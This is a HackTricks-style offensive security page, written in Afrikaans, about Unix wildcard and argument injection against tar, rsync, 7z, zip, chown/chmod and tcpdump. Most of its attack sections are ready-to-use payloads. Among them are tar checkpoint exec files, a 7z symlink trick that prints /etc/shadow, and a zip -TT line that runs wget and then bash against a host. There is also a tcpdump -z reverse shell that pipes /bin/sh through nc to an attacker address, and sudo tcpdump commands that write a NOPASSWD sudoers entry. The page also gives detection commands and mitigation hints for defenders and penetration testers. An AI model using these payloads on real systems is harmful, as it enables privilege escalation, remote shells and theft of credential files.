# Ekstra truuks met wildcards

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (ook bekend as *glob*) **argument injection** vind plaas wanneer ’n bevoorregte script ’n Unix-binêre lêer soos `tar`, `chown`, `rsync`, `zip`, `7z`, … uitvoer met ’n wildcard soos `*` wat nie tussen aanhalingstekens geplaas is nie.  
> Omdat die shell die wildcard uitbrei **voordat** die binêre lêer uitgevoer word, kan ’n aanvaller wat lêers in die werkgids kan skep, lêername saamstel wat met `-` begin, sodat hulle as **opsies eerder as data** geïnterpreteer word. Só kan arbitrêre vlae of selfs opdragte ingesmokkel word.<sup>[[6]](#references)</sup>  
> Hierdie bladsy versamel die nuttigste primitives, onlangse navorsing en moderne opsporingsmetodes vir 2023-2025.

## chown / chmod

Jy kan die eienaar/groep of toestemmingsbisse van ’n verwysingslêer **kopieer** deur die `--reference`-vlag te misbruik wanneer ’n lêernaam wat soos ’n opsie lyk, deur ’n wildcard uitgebrei word.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Wanneer root later iets soos die volgende uitvoer:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

Die uitgebreide `--reference=.drf.php` ignoreer die eksplisiete eienaar/modus, wat veroorsaak dat ooreenstemmende lêers metadata van `.drf.php` erf (en, met die opstelling hierbo, deur die aanvaller geskryf kan word).<sup>[[6]](#references)</sup>

Gaan die hele bevoorregte helper na, nie net sy `chown`-reël nie. ’n Eienaarskapverandering kan set-user-ID- of set-group-ID-bisse uitvee; [POSIX laat die bevoorregte geval as implementasiegedefinieerd](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). ’n Latere `chmod` in dieselfde taak kan daardie bisse herstel op lêers wat dit vroeër gekies het, en sodoende die uitkoms verander. Bevestig die werklike opdragvolgorde, skryfbare glob-gids, gedrag van geraakte lêers en skakels, die resulterende eienaar en modus, en of die montering set-user-ID eerbiedig voordat jy dit as ’n uitvoerbare voorregpad beskou. ’n Helper wat nie gelees kan word nie, laat daardie stappe onbekend.

*PoC en hulpmiddel*: [`wildpwn`](https://github.com/localh0t/wildpwn) (gekombineerde aanval).<sup>[[7]](#references)</sup>
Sien ook die klassieke DefenseCode-artikel vir besonderhede.<sup>[[6]](#references)</sup>

---

## GNU `cp` in ’n bevoorregte skrip

Gaan ’n skrip na wat as root loop en uit die werkgids kies wat deur die oproeper bepaal word, met ’n kaal glob, soos `cp .version * /etc/app/staged/`, wanneer ’n gebruiker met minder voorregte lêername daar kan skep. GNU `cp` kan ’n lêernaam wat met ’n koppelteken begin en deur `*` uitgebrei word, as ’n opsie ontleed. Die `--preserve=mode`-opsie kan bronmodusbisse op ’n nuwe kopie behou, en `--target-directory` kan die kopieerbestemming verander. Om enige van hierdie gevolge te bevestig, moet die presiese skriptvertakking, bestemmingstoestand, effektiewe voorreg, lêerstelselbeleid en GNU `cp`-gedrag nagegaan word; die teks van ’n sudo-reël of skrip alleen bewys nie voorregverhoging nie. As jy operande met `./` voorafgaan of die opsie-ontleding met `--` beëindig, voorkom dit hierdie interpretasie van ’n voorste koppelteken deur GNU `cp` ([GNU Coreutils FAQ](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [`cp`-handleiding](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

Voer arbitrêre opdragte uit deur GNU tar se **checkpoint**-funksie en checkpoint-aksies te misbruik.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Sodra root byvoorbeeld `tar -czf /root/backup.tgz *` uitvoer, word `shell.sh` as root uitgevoer.<sup>[[10]](#references)</sup>

### Caveat oor bsdtar / macOS-kompressor-oorheersing

Die verstek-`tar` op onlangse macOS-weergawes (gebaseer op `libarchive`) bied nie GNU tar se `--checkpoint`-koppelvlak nie, maar bsdtar dokumenteer **--use-compress-program** om ’n eksterne kompressor te kies.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Wanneer ’n bevoorregte script `tar -cf backup.tar *` uitvoer, kies dit `sh` via die slagoffer se `PATH`, en bsdtar begin dit as die kompressor.<sup>[[11]](#references)</sup> Dit bewys option injection, maar is nie op sigself ’n betroubare arbitrary-command-primitive nie: ’n lêernaam wat deur ’n wildcard geskep word, kan nie `/` bevat nie, en bsdtar verskaf argiefdata eerder as ’n shell-opdrag wat die aanvaller gekies het. Kode-uitvoering vereis ook ’n beheerbare uitvoerbare lêer wat via `PATH` opgelos word, of ’n ander argumentkanaal wat ’n bruikbare program kan spesifiseer.

---

## rsync

`rsync` laat jou toe om die remote shell of die remote binary te oorskryf met command-line flags soos `-e` en `--rsync-path`.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

As root later die gids argiveer met `rsync -az * backup:/srv/`, kan die ingespuite flag ’n shell via die remote-shell-meganisme laat loop.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Selfs wanneer die bevoorregte script die wildcard *verdedigend* met `--` voorafgaan (om te keer dat opsies ontleed word), aanvaar die 7-Zip CLI **lêerlyslêers** wanneer die lêernaam met `@` voorafgegaan word. Deur dit met ’n symlink te kombineer, kan jy *arbitrêre lêers exfiltrate*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

As root iets soos die volgende uitvoer:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip sal probeer om `root.txt` (→ `/etc/shadow`) as ’n lêerlys te lees en sal ophou, **terwyl dit die inhoud na stderr druk**.<sup>[[13]](#references)</sup>

Dit oorleef `-- *`, omdat die 7-Zip CLI beide gewone lêername en `@listfiles` uitdruklik as posisionele invoere aanvaar, dus word ’n letterlike lêernaam soos `@root.txt` steeds spesiaal behandel.<sup>[[13]](#references)</sup>

---

## zip

Twee baie praktiese primitiewe bestaan wanneer ’n toepassing gebruikerbeheerde lêername aan `zip` deurgee (hetsy via ’n jokerteken of deur name op te som sonder `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` aktiveer “toets argief” en `-TT <cmd>` vervang die toetsprogram met ’n arbitrêre program (lang vorm: `--unzip-command <cmd>`). As jy lêername kan inspuit wat met `-` begin, versprei die vlaggies oor afsonderlike lêername sodat kortopsie-ontleding werk.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Aantekeninge
- Moenie ’n enkele lêernaam soos `'-T -TT <cmd>'` probeer nie — kort opsies word per karakter ontleed en dit sal misluk. Gebruik afsonderlike tokens soos getoon.<sup>[[3]](#references)</sup>
- As die app skuinsstrepe uit lêername verwyder, haal inhoud van ’n kaal host/IP af (verstekpad `/index.html`), stoor dit plaaslik met `-O` en voer dit dan uit.<sup>[[3]](#references)</sup>
- Jy kan die ontleding ontfout met `-sc` (wys verwerkte argv) of `-h2` (meer hulp) om te verstaan hoe jou tokens verwerk word.<sup>[[3]](#references)</sup>

Voorbeeld (plaaslike gedrag op zip 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: As die weblaag `zip` se stdout/stderr teruggee (algemeen by naïewe wrappers), sal ingespuite vlae soos `--help` of foute weens ongeldige opsies in die HTTP-respons verskyn, wat command-line injection bevestig en help om payloads te verfyn.<sup>[[3]](#references)</sup>

---

## Bykomende option-injection-kandidate

Wanneer ’n bevoorregte wrapper ’n skryfbare gids met ’n wildcard uitbrei, is hierdie gedokumenteerde opsiehakies die moeite werd om na te gaan.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Vlag om te misbruik | Effek |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Gee ’n opdragstring aan ’n shell deur |
| `git`   | `-c core.sshCommand=<cmd>` | Gebruik `<cmd>` in plaas van SSH vir Git fetch/push |
| `scp`   | `-S <program>` | Gebruik ’n alternatiewe SSH-versoenbare verbindingsprogram |

Hierdie primitiewe is nuttige kontroles benewens die klassieke *tar/rsync/zip*.

---

## Soek na kwesbare wrappers en take

Onlangse gevallestudies en riglyne vir opsporing toon dat wildcard/argv-injection nie meer net ’n **cron + tar**-probleem is nie.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Dieselfde foutklas duik steeds op in:

- webkenmerke wat "alles as zip/tar aflaai" vanuit oplaai-gidse wat deur aanvallers beheer word
- vendor/appliance-foutopsporingshells wat ’n **tcpdump**-wrapper blootstel met lêernaam-/filtervelde wat deur aanvallers beheer word
- rugsteun- of rotasietake wat `tar`, `rsync`, `7z`, `zip`, `chown` of `chmod` op skryfbare gidse uitvoer

Nuttige triage-opdragte (die `pspy`-aanroeping gebruik sy gedokumenteerde proses-/lêergebeurtenis- en intervalvlae).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Vinnige heuristieke:

- `-- *` is ’n goeie oplossing vir baie GNU-gereedskap, maar **nie** vir `7z`/`7za` nie, omdat `@listfiles` afsonderlik ontleed word.<sup>[[13]](#references)</sup>
- Vir `zip`, soek na wrappers wat lêername wat deur die gebruiker beheer word, direk lys; kortopsie-splitsing (`-T` + `-TT <cmd>`) werk steeds, selfs sonder ’n shell-glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Vir `tcpdump`, let veral op wrappers waarmee jy **uitvoerlêername**, **rotasie-instellings** of argumente vir die terugspeel van opname-lêers kan beheer.<sup>[[18]](#references)</sup>

---

## tcpdump-rotasie-hooks (-G/-W/-z): RCE via argv-inspuiting in wrappers

Wanneer ’n beperkte shell of verskaffer-wrapper ’n `tcpdump`-opdragreël saamstel deur velde wat deur die gebruiker beheer word (bv. ’n "lêernaam"-parameter) aaneen te voeg sonder streng aanhalingstekens of validering, kan jy ekstra `tcpdump`-vlae insmokkel. Die kombinasie van `-G` (tydgebaseerde rotasie), `-W` (beperk die aantal lêers) en `-z <cmd>` (opdrag ná rotasie) maak arbitrêre opdraguitvoering moontlik as die gebruiker wat tcpdump uitvoer (dikwels root op toestelle).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Voorvereistes:

- Jy kan die `argv` wat aan `tcpdump` deurgegee word, beïnvloed (bv. via ’n wrapper soos `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Die wrapper ontsmet nie spasies of tokens in die lêernaamveld wat met `-` begin nie.<sup>[[4]](#references)</sup>

Klassieke PoC (voer ’n reverse-shell-script vanaf ’n skryfbare pad uit).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Besonderhede:

- `-G 1` roteer elke sekonde, en `-W 1` stop ná een geroteerde lêer; die vaslegging moet ’n ooreenstemmende pakkie ontvang voordat die rotasie plaasvind.<sup>[[18]](#references)</sup>
- `-z <cmd>` voer die post-rotate-opdrag een keer per rotasie uit en gee die pad na die geslote savefile as ’n argument deur; maak seker dat die argumenthantering van die script/tolk met jou payload ooreenstem.<sup>[[18]](#references)</sup>

Variante sonder verwyderbare media:

- As jy enige ander primitive het om lêers te skryf (bv. ’n aparte opdrag-wrapper wat uitvoerherleiding toelaat), plaas jou script in ’n bekende pad en aktiveer `-z /path/script.sh`; laat die script self `/bin/sh` aanroep indien nodig.<sup>[[18]](#references)</sup>
- As ’n verskaffer se wrapper jou toelaat om die geroteerde pad te kies, oudit daardie padbeheer slegs in kombinasie met ’n post-rotate-opdrag wat sy savefile-argument interpreteer; padbeheer alleen voer nie lêerinhoud uit nie.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump met jokertekens/bykomende argumente → arbitrêre skryf-/leestoegang en root

Voorbeeld van ’n sudoers-teenpatroon:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

Die reël laat verskeie opsies toe volgens tcpdump se gedokumenteerde parser:<sup>[[3]](#references)[[18]](#references)</sup>
- Die `*`-glob en permissiewe patrone beperk net die eerste `-w`-argument. `tcpdump` aanvaar verskeie `-w`-opsies; die laaste een geld.<sup>[[3]](#references)[[18]](#references)</sup>
- Die reël beperk nie ander opsies nie, dus word `-Z`, `-r`, `-V`, ens. toegelaat.<sup>[[3]](#references)[[18]](#references)</sup>

Die relevante primitiewe word hieronder gedokumenteer.<sup>[[3]](#references)[[18]](#references)</sup>
- Override die bestemmingspad met ’n tweede `-w` (die eerste een voldoen net aan sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal binne die eerste `-w` om uit die beperkte boom te ontsnap.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Dwing eienaarskap van uitvoer af met `-Z root` (skep lêers wat deur root besit word, enige plek).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Skryf van arbitrêre inhoud deur ’n vervaardigde PCAP met `-r` te herspeel (bv. om ’n sudoers-reël by te voeg).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Skep ’n PCAP wat die presiese ASCII-loong bevat en skryf dit as root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Arbitrêre lêerlees/geheime leak met `-V <file>` (interpreteer 'n lys savefiles). Foutdiagnostiek eggo dikwels reëls, wat inhoud laat leak.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip-argumentinjectie na RCE + tcpdump sudo-wanopstelling vir privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Volledige Exploit-ketting](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Moontlike Shell via Wildcard Injection bespeur](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Terug na die toekoms: Unix-wildcards buite beheer (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown`-aanroep](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod`-aanroep](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar-kontrolepunte](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1)-handleiding](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1)-handleiding](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip-opdragreëlsintaksis](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1)-handleiding](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git-konfigurasiedokumentasie](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp`-handleiding](https://man.openbsd.org/scp)
- [18] [tcpdump(8)-handleiding](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
